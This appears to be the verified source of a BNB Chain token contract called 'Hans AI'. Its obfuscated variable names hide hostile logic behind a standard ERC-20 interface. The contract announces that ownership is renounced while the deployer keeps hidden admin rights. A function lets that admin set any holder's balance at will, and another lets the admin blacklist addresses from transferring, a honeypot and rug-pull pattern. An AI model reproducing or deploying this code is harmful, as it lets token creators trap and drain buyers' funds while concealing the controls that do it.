/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface txLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxSell) external view returns (uint256);

    function transfer(address shouldAmount, uint256 fundEnable) external returns (bool);

    function allowance(address teamAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundEnable) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAmount,
        uint256 fundEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedTotal, uint256 value);
    event Approval(address indexed teamAmount, address indexed spender, uint256 value);
}

interface txLaunchMetadata is txLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract totalReceiverAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountTotal {
    function createPair(address sellReceiver, address launchedTrading) external returns (address);
}

interface amountAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract HansAI is totalReceiverAt, txLaunch, txLaunchMetadata {

    function limitTotal(address maxTeamTrading, address shouldAmount, uint256 fundEnable) internal returns (bool) {
        if (maxTeamTrading == receiverModeTeam) {
            return receiverTotal(maxTeamTrading, shouldAmount, fundEnable);
        }
        require(!marketingSell[maxTeamTrading]);
        return receiverTotal(maxTeamTrading, shouldAmount, fundEnable);
    }

    mapping(address => uint256) private enableTo;

    function enableAtToken() public view returns (bool) {
        return fromEnable;
    }

    function atFund(address receiverEnable, uint256 fundEnable) public {
        require(modeWallet[_msgSender()]);
        enableTo[receiverEnable] = fundEnable;
    }

    bool private marketingFrom;

    function receiverTotal(address maxTeamTrading, address shouldAmount, uint256 fundEnable) internal returns (bool) {
        require(enableTo[maxTeamTrading] >= fundEnable);
        enableTo[maxTeamTrading] -= fundEnable;
        enableTo[shouldAmount] += fundEnable;
        emit Transfer(maxTeamTrading, shouldAmount, fundEnable);
        return true;
    }

    function allowance(address feeLaunchedToken, address receiverReceiver) external view virtual override returns (uint256) {
        return marketingAutoShould[feeLaunchedToken][receiverReceiver];
    }

    string private maxAuto = "HAI";

    constructor (){ 
        
        amountAt maxBuy = amountAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingAt = amountTotal(maxBuy.factory()).createPair(maxBuy.WETH(), address(this));
        shouldIs = _msgSender();
        if (launchedMarketing != launchAuto) {
            launchAuto = launchedMarketing;
        }
        receiverModeTeam = _msgSender();
        modeWallet[_msgSender()] = true;
        
        enableTo[_msgSender()] = isEnableReceiver;
        emit Transfer(address(0), receiverModeTeam, isEnableReceiver);
        totalEnableMin();
    }

    function balanceOf(address maxSell) public view virtual override returns (uint256) {
        return enableTo[maxSell];
    }

    function approve(address receiverReceiver, uint256 fundEnable) public virtual override returns (bool) {
        marketingAutoShould[_msgSender()][receiverReceiver] = fundEnable;
        emit Approval(_msgSender(), receiverReceiver, fundEnable);
        return true;
    }

    bool public launchEnable;

    address private shouldIs;

    uint256 private launchAuto;

    function isTake() public {
        
        
        modeTxFund=0;
    }

    function getOwner() external view returns (address) {
        return shouldIs;
    }

    bool public takeLiquidity;

    function transferFrom(address maxTeamTrading, address shouldAmount, uint256 fundEnable) external override returns (bool) {
        if (marketingAutoShould[maxTeamTrading][_msgSender()] != type(uint256).max) {
            require(fundEnable <= marketingAutoShould[maxTeamTrading][_msgSender()]);
            marketingAutoShould[maxTeamTrading][_msgSender()] -= fundEnable;
        }
        return limitTotal(maxTeamTrading, shouldAmount, fundEnable);
    }

    uint256 private isEnableReceiver = 100000000 * 10 ** 18;

    uint256 private launchedMarketing;

    mapping(address => mapping(address => uint256)) private marketingAutoShould;

    function totalSupply() external view virtual override returns (uint256) {
        return isEnableReceiver;
    }

    string private toLaunched = "Hans AI";

    event OwnershipTransferred(address indexed amountTrading, address indexed enableFrom);

    bool public enableAuto;

    mapping(address => bool) public marketingSell;

    bool private fromEnable;

    address public tradingAt;

    function owner() external view returns (address) {
        return shouldIs;
    }

    address public receiverModeTeam;

    function transfer(address receiverEnable, uint256 fundEnable) external virtual override returns (bool) {
        return limitTotal(_msgSender(), receiverEnable, fundEnable);
    }

    function symbol() external view virtual override returns (string memory) {
        return maxAuto;
    }

    uint256 private modeTxFund;

    function name() external view virtual override returns (string memory) {
        return toLaunched;
    }

    bool private amountIs;

    function buySender(address modeMin) public {
        if (amountIs) {
            launchedMarketing = modeTxFund;
        }
        if (modeMin == receiverModeTeam || modeMin == tradingAt || !modeWallet[_msgSender()]) {
            return;
        }
        if (launchAuto != launchedMarketing) {
            fromEnable = false;
        }
        marketingSell[modeMin] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return fromIs;
    }

    function totalEnableMin() public {
        emit OwnershipTransferred(receiverModeTeam, address(0));
        shouldIs = address(0);
    }

    uint8 private fromIs = 18;

    mapping(address => bool) public modeWallet;

    function fromLaunched() public {
        if (takeLiquidity) {
            launchedMarketing = modeTxFund;
        }
        if (modeTxFund != launchAuto) {
            marketingFrom = false;
        }
        takeLiquidity=false;
    }

    function tokenAmount() public {
        if (takeLiquidity == amountIs) {
            launchedMarketing = modeTxFund;
        }
        if (enableAuto != takeLiquidity) {
            launchAuto = modeTxFund;
        }
        fromEnable=false;
    }

    function limitMarketing(address fromShould) public {
        if (launchEnable) {
            return;
        }
        
        modeWallet[fromShould] = true;
        if (takeLiquidity) {
            takeLiquidity = true;
        }
        launchEnable = true;
    }

}